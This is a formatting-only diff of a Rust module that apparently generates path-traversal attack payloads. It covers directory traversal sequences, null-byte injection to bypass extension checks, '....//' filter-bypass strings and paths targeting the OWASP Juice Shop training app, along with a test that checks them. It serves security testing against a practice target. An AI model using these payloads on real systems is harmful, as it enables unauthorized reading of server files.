@@ -38,9 +38,21 @@ impl TraversalPayload {
 pub fn basic_traversals(depth: usize, target_file: &str) -> Vec<TraversalPayload> {
     let sequence = "../".repeat(depth);
     vec![
-        TraversalPayload::new("Unix style", format!("{}{}", sequence, target_file), TraversalEncoding::None),
-        TraversalPayload::new("Windows style", format!("{}{}", sequence.replace("/", "\\"), target_file), TraversalEncoding::None),
-        TraversalPayload::new("Mixed slashes", format!("{}{}", sequence.replace("../", "..\\"), target_file), TraversalEncoding::None),
+        TraversalPayload::new(
+            "Unix style",
+            format!("{}{}", sequence, target_file),
+            TraversalEncoding::None,
+        ),
+        TraversalPayload::new(
+            "Windows style",
+            format!("{}{}", sequence.replace("/", "\\"), target_file),
+            TraversalEncoding::None,
+        ),
+        TraversalPayload::new(
+            "Mixed slashes",
+            format!("{}{}", sequence.replace("../", "..\\"), target_file),
+            TraversalEncoding::None,
+        ),
     ]
 }
 
@@ -77,7 +89,11 @@ pub fn url_encoded_traversals(depth: usize, target_file: &str) -> Vec<TraversalP
 }
 
 /// Null byte injection payloads (for bypassing extension checks)
-pub fn null_byte_traversals(depth: usize, target_file: &str, allowed_ext: &str) -> Vec<TraversalPayload> {
+pub fn null_byte_traversals(
+    depth: usize,
+    target_file: &str,
+    allowed_ext: &str,
+) -> Vec<TraversalPayload> {
     let sequence = "../".repeat(depth);
     vec![
         TraversalPayload::new(
@@ -130,7 +146,10 @@ pub fn filter_bypass_traversals(target_file: &str) -> Vec<TraversalPayload> {
     vec![
         TraversalPayload::new(
             "....// bypass",
-            format!("....//....//....//....//....//....//....//....//....//..../{}", target_file),
+            format!(
+                "....//....//....//....//....//....//....//....//....//..../{}",
+                target_file
+            ),
             TraversalEncoding::Mixed,
         ),
         TraversalPayload::new(
@@ -220,11 +239,7 @@ pub fn juice_shop_traversal() -> Vec<TraversalPayload> {
             "/ftp/quarantine/",
             TraversalEncoding::None,
         ),
-        TraversalPayload::new(
-            "Support logs",
-            "/support/logs",
-            TraversalEncoding::None,
-        ),
+        TraversalPayload::new("Support logs", "/support/logs", TraversalEncoding::None),
         TraversalPayload::new(
             "Access log",
             "/support/logs/access.log",
@@ -282,7 +297,9 @@ mod tests {
     #[test]
     fn test_juice_shop_traversal() {
         let payloads = juice_shop_traversal();
-        assert!(payloads.iter().any(|p| p.payload.contains("package.json.bak")));
+        assert!(payloads
+            .iter()
+            .any(|p| p.payload.contains("package.json.bak")));
         assert!(payloads.iter().any(|p| p.payload.contains("%2500")));
     }
 
